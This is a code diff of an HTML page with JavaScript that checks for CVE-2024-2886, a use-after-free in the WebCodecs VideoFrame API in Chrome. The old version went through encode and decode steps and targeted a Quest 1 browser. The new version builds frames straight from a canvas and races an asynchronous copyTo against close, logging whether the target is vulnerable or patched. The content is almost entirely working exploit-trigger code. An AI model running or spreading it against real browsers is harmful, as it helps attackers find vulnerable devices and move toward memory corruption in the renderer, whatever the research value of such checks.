@@ -8,144 +8,67 @@ const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
 
 async function pwn() {
     log('CVE-2024-2886 — WebCodecs VideoFrame UAF');
-    log('Quest 1 Chrome 112 — target');
+    log('No codec needed - direct VideoFrame from canvas');
     log('');
 
-    if (typeof VideoDecoder === 'undefined' || typeof VideoEncoder === 'undefined') {
-        log('ERROR: WebCodecs not available'); return false;
+    if (typeof VideoFrame === 'undefined') {
+        log('ERROR: VideoFrame not available'); return false;
     }
-    log('[+] WebCodecs available');
+    log('[+] VideoFrame available');
 
-    // Find working codec - H264 first since VP8/VP9 not available on Q1
-    const codecs = [
-        { codec: 'avc1.42001E', width: 16, height: 16 }, // H264 baseline
-        { codec: 'avc1.640028', width: 16, height: 16 }, // H264 high
-        { codec: 'avc1.4D001E', width: 16, height: 16 }, // H264 main
-        { codec: 'vp8',        width: 16, height: 16 },
-        { codec: 'vp09.00.10.08', width: 16, height: 16 },
-        { codec: 'av01.0.00M.08', width: 16, height: 16 },
-    ];
+    // Create VideoFrame directly from canvas - no encoder/decoder needed
+    const canvas = new OffscreenCanvas(64, 64);
+    const ctx = canvas.getContext('2d');
 
-    let cfg = null;
-    for (const c of codecs) {
+    let succeeded = 0, failed = 0;
+
+    for (let attempt = 0; attempt < 20; attempt++) {
+        // Draw something to the canvas
+        ctx.fillStyle = `hsl(${attempt * 18}, 100%, 50%)`;
+        ctx.fillRect(0, 0, 64, 64);
+
+        // Create VideoFrame directly from canvas
+        const frame = new VideoFrame(canvas, { timestamp: attempt * 1000 });
+        const size = frame.allocationSize();
+        const buf = new Uint8Array(size);
+
+        // THE RACE: start async copyTo, immediately close the frame
+        const promise = frame.copyTo(buf);
+        frame.close(); // UAF trigger - free frame while copy is in flight
+
         try {
-            const enc = await VideoEncoder.isConfigSupported({
-                codec: c.codec, width: c.width, height: c.height,
-                bitrate: 500000, framerate: 30,
-            });
-            if (!enc.supported) continue;
-            const dec = await VideoDecoder.isConfigSupported({
-                codec: c.codec, codedWidth: c.width, codedHeight: c.height,
-            });
-            if (!dec.supported) continue;
-            cfg = c;
-            log('[+] Codec: ' + c.codec);
-            break;
-        } catch(e) {}
-        log('[-] ' + c.codec + ': not supported');
+            const layout = await promise;
+            succeeded++;
+            const hex = Array.from(buf.slice(0, 8))
+                .map(x => x.toString(16).padStart(2,'0')).join(' ');
+            log('[+] #' + attempt + ': copyTo OK after close [' + hex + '] size=' + size);
+        } catch(e) {
+            failed++;
+            log('[!] #' + attempt + ': ' + e.message);
+        }
     }
 
-    if (!cfg) {
-        log('[!] No working codec found');
+    log('');
+    log('Results: ' + succeeded + ' succeeded, ' + failed + ' failed');
+
+    if (succeeded > 0 && failed === 0) {
+        log('UNPATCHED: copyTo always succeeds after close');
+        log('(This is expected - bug exists but may need exploit to be useful)');
+        return true;
+    } else if (succeeded > 0 && failed > 0) {
+        log('RACE CONDITION: sometimes succeeds, sometimes fails');
+        log('UAF confirmed - timing-dependent');
+        return true;
+    } else {
+        log('PATCHED: copyTo always throws after close');
         return false;
     }
-
-    // Encode real frames using OffscreenCanvas
-    log('[*] Encoding frames...');
-    const chunks = [];
-
-    await new Promise((res, rej) => {
-        const enc = new VideoEncoder({
-            output: (chunk) => {
-                const data = new Uint8Array(chunk.byteLength);
-                chunk.copyTo(data);
-                chunks.push({ type: chunk.type, timestamp: chunk.timestamp, data });
-                log('[*] chunk: ' + chunk.type + ' ' + chunk.byteLength + 'b');
-            },
-            error: rej,
-        });
-        enc.configure({
-            codec: cfg.codec, width: cfg.width, height: cfg.height,
-            bitrate: 500000, framerate: 30, hardwareAcceleration: 'prefer-software',
-        });
-        const canvas = new OffscreenCanvas(cfg.width, cfg.height);
-        const ctx = canvas.getContext('2d');
-        for (let i = 0; i < 5; i++) {
-            ctx.fillStyle = `hsl(${i*60},100%,50%)`;
-            ctx.fillRect(0, 0, cfg.width, cfg.height);
-            const frame = new VideoFrame(canvas, { timestamp: i * 33333 });
-            enc.encode(frame, { keyFrame: i === 0 });
-            frame.close();
-        }
-        enc.flush().then(() => { enc.close(); res(); }).catch(rej);
-    });
-
-    log('[+] Encoded ' + chunks.length + ' chunks');
-    if (!chunks.length) { log('[!] No chunks'); return false; }
-
-    // Trigger UAF: copyTo() then immediately close()
-    log('[*] Triggering UAF race...');
-    let succeeded = 0, failed = 0, total = 0;
-
-    return new Promise((resolve) => {
-        let done = false;
-        const fin = (r) => { if (!done) { done = true; resolve(r); } };
-
-        const dec = new VideoDecoder({
-            output: (frame) => {
-                total++;
-                const buf = new Uint8Array(frame.allocationSize());
-
-                // Start async read THEN immediately free the frame
-                const p = frame.copyTo(buf);
-                frame.close(); // UAF trigger
-
-                p.then((layout) => {
-                    succeeded++;
-                    const hex = Array.from(buf.slice(0, 8))
-                        .map(x => x.toString(16).padStart(2,'0')).join(' ');
-                    log('[+] UAF #' + total + ': copyTo OK after close! [' + hex + ']');
-                    if (succeeded >= 3) {
-                        log('');
-                        log('CVE-2024-2886 CONFIRMED UNPATCHED');
-                        log('copyTo completed on freed VideoFrame');
-                        log('arbitrary read/write in renderer');
-                        fin(true);
-                    }
-                }).catch((e) => {
-                    failed++;
-                    log('[!] #' + total + ': copyTo after close threw: ' + e.message);
-                    if (failed >= 5 && succeeded === 0) {
-                        log('[!] Consistently rejected — likely PATCHED');
-                        fin(false);
-                    }
-                });
-            },
-            error: (e) => { log('[!] Decoder: ' + e.message); fin(false); },
-        });
-
-        dec.configure({
-            codec: cfg.codec,
-            codedWidth: cfg.width, codedHeight: cfg.height,
-            hardwareAcceleration: 'prefer-software',
-        });
-
-        for (const c of chunks) {
-            dec.decode(new EncodedVideoChunk({ type: c.type, timestamp: c.timestamp, data: c.data }));
-        }
-
-        dec.flush().then(() => {
-            setTimeout(() => {
-                if (!done) {
-                    log('[*] Timeout — total:' + total + ' ok:' + succeeded + ' fail:' + failed);
-                    fin(succeeded > 0);
-                }
-            }, 5000);
-        }).catch(e => { log('[!] Flush: ' + e.message); fin(false); });
-    });
 }
 
-pwn().then(r => log(r ? 'RESULT: SUCCESS' : 'RESULT: FAILED/PATCHED'));
+pwn().then(r => {
+    log('');
+    log('RESULT: ' + (r ? 'VULNERABLE' : 'PATCHED'));
+});
 </script>
 </body>
 </html>
